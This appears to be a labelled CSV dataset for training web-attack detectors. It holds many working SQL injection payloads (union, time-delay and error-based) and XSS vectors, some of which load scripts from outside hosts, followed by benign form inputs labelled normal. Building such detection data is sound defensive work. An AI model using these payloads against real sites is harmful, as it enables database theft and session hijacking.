"payload","length","attack_type","label"
"1)) as khvx where 7533=7533 union all select null,null,null,null,null,null,null,null--","86","sqli","anom"
"1"")));select pg_sleep(5) and (((""wqeb""=""wqeb","44","sqli","anom"
"-2872) where 8797=8797 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","153","sqli","anom"
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf","67","sqli","anom"
"(select (chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3287=3287) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","169","sqli","anom"
"-2216"") where 6692=6692 union all select 6692,6692,6692#","56","sqli","anom"
"-4135'))) union all select 4413,4413,4413#","42","sqli","anom"
"1%'))) union all select null,null--","35","sqli","anom"
"-6279') union all select 3026,3026,3026,3026,3026,3026,3026,3026--","66","sqli","anom"
"1) and 3824=benchmark(5000000,md5(0x76555642)) and (6786=6786","61","sqli","anom"
"-2291)) or 4067=5666#","21","sqli","anom"
"1"")) as xtlt where 9293=9293;select case when 7717=7717 then 1 else null end--","78","sqli","anom"
"1""));waitfor delay '0:0:5'--","28","sqli","anom"
"1') where 6672=6672 union all select null,null,null,null,null,null,null,null,null,null--","88","sqli","anom"
"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>","271","xss","anom"
"';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>"">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>","457","xss","anom"
"<script>alert(""crosssitescripting2"")</script>","45","xss","anom"
"<script>alert(document.cookie)</script>","39","xss","anom"
"<script>alert('vl')</script>","28","xss","anom"
"<!--#exec cmd=""/bin/echo '<scr'""--><!--#exec cmd=""/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'""-->","134","xss","anom"
"<img src=javascript:alert(""crosssitescripting"")>"";' >","53","xss","anom"
"<script>alert(""crosssitescripting"")</script>"";' >","49","xss","anom"
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>","100","xss","anom"
"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>","425","xss","anom"
"<script src=http://vulnerability-lab.com/crosssitescripting.js></script>","72","xss","anom"
"<<script>alert(""crosssitescripting"");//<</script>","49","xss","anom"
"<script src=//vulnerability-lab.com/.js>","40","xss","anom"
"<script>a=/crosssitescripting/ alert(a.source)</script>","55","xss","anom"
"<script a=`>` src=""http://vulnerability-lab.com/crosssitescripting.js""></script>","80","xss","anom"
"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>","110","xss","anom"
"<img src=""javascript:alert('crosssitescripting');"">","51","xss","anom"
"<img src=javascript:alert('crosssitescripting')>","48","xss","anom"
"<img src=`javascript:alert(""rm'crosssitescripting'"")`>","54","xss","anom"
"<img """"""><script>alert(""crosssitescripting"")</script>"">","55","xss","anom"
"<img src=""jav ascript:alert('crosssitescripting');"">","52","xss","anom"
"<img src="" javascript:alert('crosssitescripting');"">","52","xss","anom"
"<img dynsrc=""javascript:alert('crosssitescripting')"">","53","xss","anom"
"<img lowsrc=""javascript:alert('crosssitescripting')"">","53","xss","anom"
"<img src=""mocha:[code]"">","24","xss","anom"
"<img src=""livescript:[code]"">","29","xss","anom"
"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">","106","xss","anom"
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">","96","xss","anom"
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">","92","xss","anom"
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-","142","xss","anom"
"<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>","129","xss","anom"
"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>","65","xss","anom"
"<style type=""text/javascript"">alert('crosssitescripting');</style>","66","xss","anom"
"<style>.crosssitescripting{background-image:url(""javascript:alert('crosssitescripting')"");}</style><a class=crosssitescripting></a>","131","xss","anom"
"<style>li {list-style-image: url(""javascript:alert('crosssitescripting')"");}</style><ul><li>crosssitescripting","110","xss","anom"
"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>","114","xss","anom"
"<div style=""background-image:52c8'a161332904a1c5248.10278.1053379'9"">","69","xss","anom"
"<div style=""width: expression(alert('crosssitescripting'));"">","61","xss","anom"
"<link rel=""stylesheet"" href=""javascript:alert('crosssitescripting');"">","70","xss","anom"
"<link rel=""stylesheet"" href=""http://vulnerability-lab.com/crosssitescripting.css"">","82","xss","anom"
"<body onload=alert('crosssitescripting')>","41","xss","anom"
"<img low id=xss src=""javascript:alert('xss')"">","46","xss","anom"
"<link rel=""stylesheet"" href=""javascript:alert('xss');"">","55","xss","anom"
"<img id=xss src='vbscript:msgbox(""xss"")'>","41","xss","anom"
"<table id=xss background=""javascript:alert('xss')"">","51","xss","anom"
"<table id=xss><td background=""javascript:alert('xss')"">","55","xss","anom"
"<div id=xss style=""width: expression(alert('xss'));"">","53","xss","anom"
"<iframe id=xss src=""javascript:alert('xss');""></iframe>","55","xss","anom"
"<table background=""javascript:alert('xss')"">","44","xss","anom"
"<table><td background=""javascript:alert('xss')"">""","49","xss","anom"
"<img id=xss style=""xss:expr/*xss*/ession(alert('xss'))"">","56","xss","anom"
"<style type=""text/javascript"">alert('xss');</style>","51","xss","anom"
"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>","78","xss","anom"
"<base href=""javascript:alert('xss');//"">","40","xss","anom"
"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);","68","xss","anom"
"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>","156","xss","anom"
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>","100","xss","anom"
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>","221","xss","anom"
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">","77","xss","anom"
"<script id=xss src=http://127.0.0.1></script>","45","xss","anom"
"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>","64","xss","anom"
"<img id=xss src=""&14;javascript:alert('xss');"">","47","xss","anom"
"<iframe id=xss src=""javascript:alert('xss'); <","46","xss","anom"
"<script>a=/xss/nalert('xss');</script>","38","xss","anom"
"<div style=""background-image: url(javascript:alert('xss'));"">","61","xss","anom"
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-","126","xss","anom"
"<div onmouseover=""alert('xss');"">,","34","xss","anom"
"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">","61","xss","anom"
"<img id=xss src=&{alert('xss');};>","34","xss","anom"
"<a id=xss href=""about:<script>alert('xss');</script>"">","54","xss","anom"
"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">","63","xss","anom"
"<style><!--</style><script>alert('xss');//--></script>","54","xss","anom"
"<!-- -- --><script>alert('xss');</script><!-- -- -->","52","xss","anom"
"<img id=xss src=""blah""onmouseover=""alert('xss');"">","50","xss","anom"
"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>","62","xss","anom"
"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>","65","xss","anom"
"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>","94","xss","anom"
"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x","139","xss","anom"
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>","120","xss","anom"
"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>","122","xss","anom"
"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>","135","xss","anom"
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//","109","xss","anom"
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">","112","xss","anom"
"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>","112","xss","anom"
"<iframe id=xss / ""onload=alert(/xss/)></iframe>","47","xss","anom"
"<iframe id=xss///////onload=alert(/xss/)></iframe>","50","xss","anom"
"<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>","65","xss","anom"
"<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>","65","xss","anom"
""" onblur=alert(xss) ""> <""","25","xss","anom"
""" onmouseover=alert(xss) "">","27","xss","anom"
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss","80","xss","anom"
"</textarea>'""><script>alert(xss)</script>","41","xss","anom"
"</script></script><<<<script><>>>><<<script>alert(xss)</script>","63","xss","anom"
"<html><noalert><noscript>(xss)</noscript><script>(xss)</script>","63","xss","anom"
"}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>","60","xss","anom"
"<script>document.write(""xss"");</script>","39","xss","anom"
"='><script>alert(""xss"")</script>","32","xss","anom"
"<body background=javascript:'""><script>alert(xss)</script>></body>","66","xss","anom"
"<script>alert('xss');</script>","30","xss","anom"
"<script id=xss src=http://ha.ckers.org/xss.js></script>","55","xss","anom"
"id=xss src= <img 6;avascript:alert('xss')>","42","xss","anom"
"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>","61","xss","anom"
"<img id=xss src=""javascript:alert('xss')""","41","xss","anom"
"<script>a=/xss/","15","xss","anom"
"<img lowid=xss src=""javascript:alert('xss')"">","45","xss","anom"
"<br size=""&{alert('xss')}"">","27","xss","anom"
"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">","58","xss","anom"
"<style>@import'http://ha.ckers.org/xss.css';</style>","52","xss","anom"
"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>","75","xss","anom"
"<img id=xss src=""mocha:[code]"">","31","xss","anom"
"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">","76","xss","anom"
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">","81","xss","anom"
"<div style=""width: expression(alert('xss'));"">","46","xss","anom"
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">","49","xss","anom"
"exp/*<xss style='no\\xss:noxss(""*//*"");","38","xss","anom"
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>","83","xss","anom"
"a=""get"";","8","xss","anom"
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">","97","xss","anom"
"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>","58","xss","anom"
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->","110","xss","anom"
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-","127","xss","anom"
"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>","63","xss","anom"
"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>","65","xss","anom"
"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>","63","xss","anom"
"1' rlike (select (case when (7689=7689) then 1 else 0x28 end))","62","sqli","anom"
"1%')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('%'='","108","sqli","anom"
"1 where 7072=7072 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--","220","sqli","anom"
"-5360' where 8178=8178 union all select 8178,8178,8178--","56","sqli","anom"
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('thce'='thce","123","sqli","anom"
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))","63","sqli","anom"
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))","61","sqli","anom"
"1'||(select 'vxfx' where 7038=7038 and 9306=4187)||'","52","sqli","anom"
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual","84","sqli","anom"
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""oohx"" like ""oohx","91","sqli","anom"
"1'||(select 'brde' where 7390=7390 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))||'","237","sqli","anom"
"-6294"" union all select 9921,9921,9921,9921,9921,9921--","55","sqli","anom"
"-1630' union all select 1971,1971--","35","sqli","anom"
"1) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","97","sqli","anom"
"-9072) as saot where 2278=2278 order by 1#","42","sqli","anom"
"-3699%'))) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#","73","sqli","anom"
"1')));waitfor delay '0:0:5'--","29","sqli","anom"
"1' where 2162=2162 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","109","sqli","anom"
"1') and elt(1210=1210,sleep(5)) and ('gtov' like 'gtov","54","sqli","anom"
"-1808%"")) or 4595=3545 and ((""%""=""","34","sqli","anom"
"1')) as pdrg where 5960=5960 and 9198=9198--","44","sqli","anom"
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""kpwc"" like ""kpwc","125","sqli","anom"
"-9297) union all select 6841,6841,6841,6841,6841--","50","sqli","anom"
"1"" and 8407=(select count(*) from generate_series(1,5000000)) and ""zwov""=""zwov","78","sqli","anom"
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('lkun' like 'lkun","156","sqli","anom"
"-8824%')) or make_set(9354=9354,7185) and (('%'='","49","sqli","anom"
"1'+(select mkbv where 1648=1648 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","139","sqli","anom"
"1%""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""%""=""","93","sqli","anom"
"1'))) and 2006=2006","19","sqli","anom"
"1"") where 2657=2657 and 5309=7592--","35","sqli","anom"
"1"") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--","61","sqli","anom"
"1"") as esks where 1138=1138;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","144","sqli","anom"
"-1621' in boolean mode) order by 1--","36","sqli","anom"
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('miba'='miba","117","sqli","anom"
"1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'","151","sqli","anom"
"1)) as myxo where 1759=1759 union all select null#","50","sqli","anom"
"1 where 1636=1636 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--","113","sqli","anom"
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","103","sqli","anom"
"-6095"") as hygc where 8142=8142 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--","213","sqli","anom"
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('nopu'='nopu","123","sqli","anom"
"1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('nfix'='nfix","224","sqli","anom"
"1' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","111","sqli","anom"
"1)) union all select null,null,null,null,null,null,null,null,null#","66","sqli","anom"
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('qfwc'='qfwc","80","sqli","anom"
"1%""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""%""=""","108","sqli","anom"
"1' or sleep(5) and 'rpqn' like 'rpqn","36","sqli","anom"
"1)) and elt(1210=1210,sleep(5)) and ((5874=5874","47","sqli","anom"
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('agsi'='agsi","123","sqli","anom"
"1')) as owcw where 1107=1107 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","104","sqli","anom"
"1')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","73","sqli","anom"
"-3096' or 3821=5539 and 'zrth'='zrth","36","sqli","anom"
"1) where 2020=2020 and 2388=benchmark(5000000,md5(0x6d457153))#","63","sqli","anom"
"1"") as jiyl where 4893=4893 union all select null,null,null,null,null#","70","sqli","anom"
"1',exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))","101","sqli","anom"
"-5691' union all select 6610,6610#","34","sqli","anom"
"1) where 5234=5234 or 8514=benchmark(5000000,md5(0x544d5a4c))#","62","sqli","anom"
"1'||(select 'vwls' where 5252=5252 rlike sleep(5)#","50","sqli","anom"
"1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('foop' like 'foop","227","sqli","anom"
"1'||(select 'dezl' where 8661=8661;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'","133","sqli","anom"
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xikz' like 'xikz","87","sqli","anom"
"1')) as cyom where 2318=2318 and 7533=7533--","44","sqli","anom"
"-5580 or 4829=1968","18","sqli","anom"
"1""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","103","sqli","anom"
"1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#","114","sqli","anom"
"1%""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""","200","sqli","anom"
"1' in boolean mode) union all select null,null,null,null--","58","sqli","anom"
"-8945)) as fszo where 2320=2320 union all select 2320--","55","sqli","anom"
"1%') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='","211","sqli","anom"
"1%' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='","118","sqli","anom"
"prompt(1);>","11","xss","anom"
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","236","sqli","anom"
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'aytf' like 'aytf","84","sqli","anom"
"1' where 4272=4272 union all select null,null,null,null#","56","sqli","anom"
"-6854"" where 7794=7794 union all select 7794,7794--","51","sqli","anom"
"1'+(select bfeq where 3445=3445 and 9198=9198--","47","sqli","anom"
"1')) or 8156=(select count(*) from generate_series(1,5000000))--","64","sqli","anom"
"1' and elt(3247=3969,3969) and 'xcbm' like 'xcbm","48","sqli","anom"
"1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","145","sqli","anom"
"1%'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('%'='","78","sqli","anom"
"(select (case when (9263=9263) then 1 else 9263*(select 9263 from mysql.db) end))","81","sqli","anom"
"-9015%"") union all select 6948,6948--","37","sqli","anom"
"1'+(select sshu where 3442=3442 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'","190","sqli","anom"
"1') where 1470=1470 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","160","sqli","anom"
"-5449' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ryvy' like 'ryvy","226","sqli","anom"
"1%"")) and elt(4249=4249,7259) and ((""%""=""","41","sqli","anom"
"-7773' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')","99","sqli","anom"
"1"" order by 1--","15","sqli","anom"
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'swke'='swke","149","sqli","anom"
"-7511)) as xqzf where 9939=9939 union all select 9939,9939,9939,9939,9939,9939,9939--","85","sqli","anom"
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>","66","xss","anom"
"<table background=""javascript:alert('crosssitescripting')"">","59","xss","anom"
"<table><td background=""javascript:alert('crosssitescripting')"">","63","xss","anom"
"<br size=""&{alert('crosssitescripting')}"">","42","xss","anom"
"<a href=""http://server.com/"">crosssitescripting</a>","51","xss","anom"
"goldsmith1@esmarbella.ht","24","norm","norm"
"28867747x","9","norm","norm"
"calahorra, la","13","norm","norm"
"2239348379899052","16","norm","norm"
"8omba51a","8","norm","norm"
"1056","4","norm","norm"
"postrar","7","norm","norm"
"rayen","5","norm","norm"
"lovas@djbroadcast.bn","20","norm","norm"
"nuestra seora de la paz, 80 8f","30","norm","norm"
"37748","5","norm","norm"
"snedeker","8","norm","norm"
"brana@housemovie.id","19","norm","norm"
"80937614q","9","norm","norm"
"sant vicen de castellet","23","norm","norm"
"46179","5","norm","norm"
"morgan","6","norm","norm"
"foto3rfico","10","norm","norm"
"siu-kwok","8","norm","norm"
"gregescos","9","norm","norm"
"gonzaga ripalda","15","norm","norm"
"shue-sampson@artroscopiagc.mn","29","norm","norm"
"nuestra seora de las angustias s/n,","35","norm","norm"
"frigiliana","10","norm","norm"
"ciochon","7","norm","norm"
"sonoramente","11","norm","norm"
"ann-margaret@indorec.pro","24","norm","norm"
"26707809w","9","norm","norm"
"aldea del fresno","16","norm","norm"
"16522","5","norm","norm"
"pospalatal","10","norm","norm"
"766","3","norm","norm"
"seni+l","6","norm","norm"
"basilisa","8","norm","norm"
"bjerg@hangartalleres.er","23","norm","norm"
"78581094f","9","norm","norm"
"pineda trasmonte","16","norm","norm"
"29127","5","norm","norm"
"pintarrajar","11","norm","norm"
"gontrn","6","norm","norm"
"c/ costa i llobera 83","21","norm","norm"
"3820743619643877","16","norm","norm"
"99r5na","6","norm","norm"
"964","3","norm","norm"
"ajorca","6","norm","norm"
"pridiliano","10","norm","norm"
"16727733v","9","norm","norm"
"paraje antonio de nebrija 39,","29","norm","norm"
"margheri","8","norm","norm"
"6m2rtam267t3","12","norm","norm"
"baziga-turtuno@ofertasrusas.dz","30","norm","norm"
"c/ hermenegilda portillo, 70","28","norm","norm"
"31174","5","norm","norm"
"8859240955120408","16","norm","norm"
"macilento","9","norm","norm"
"5432","4","norm","norm"
"s3borrea","8","norm","norm"
"altaira","7","norm","norm"
"plaza movimiento ciudadano, 176","31","norm","norm"
"bollullos de la mitacin","23","norm","norm"
"zalzale1","8","norm","norm"
"vieta","5","norm","norm"
"jandette tarrida","16","norm","norm"
"castiglioni@hiperbilbao.nl","26","norm","norm"
"torms, els","10","norm","norm"
"40542","5","norm","norm"
"scotty","6","norm","norm"
"1165","4","norm","norm"
"v9n939z6","8","norm","norm"
"subirs figaredo","15","norm","norm"
"93698052p","9","norm","norm"
"gredos, 114 12?g","16","norm","norm"
"7277765230207053","16","norm","norm"
"hlinka","6","norm","norm"
"cristaldo marchan","17","norm","norm"
"dubarry@soyrojo.tr","18","norm","norm"
"bloc sant simo 93","17","norm","norm"
"miravete de la sierra","21","norm","norm"
"pakulski","8","norm","norm"
"5ecom058a?8a","12","norm","norm"
"brittni","7","norm","norm"
"tr11quil67321e","14","norm","norm"
"dennett","7","norm","norm"
"miles_detmers@sotelink.vu","25","norm","norm"
"uribitarte 72 13?g","18","norm","norm"
"pravia","6","norm","norm"
"mo19bun0a","9","norm","norm"
"buchel-alymer@gemas.org.bu","26","norm","norm"
"doctor ramon sanchez-parra, 17 11?d","35","norm","norm"
"miera","5","norm","norm"
"janna","5","norm","norm"
"eusquero","8","norm","norm"
"goddette","8","norm","norm"
"ci2586ta","8","norm","norm"
"forcades chocano","16","norm","norm"
"drohocka@baybay.mq","18","norm","norm"
"hornillos s/n,","14","norm","norm"
"valle de mena","13","norm","norm"
"anand","5","norm","norm"
"potroso","7","norm","norm"
"estaol bellet","13","norm","norm"
"verdier@zaya.name","17","norm","norm"
"c/ san pablo 130, 8h","20","norm","norm"
"50140","5","norm","norm"
"beaule","6","norm","norm"
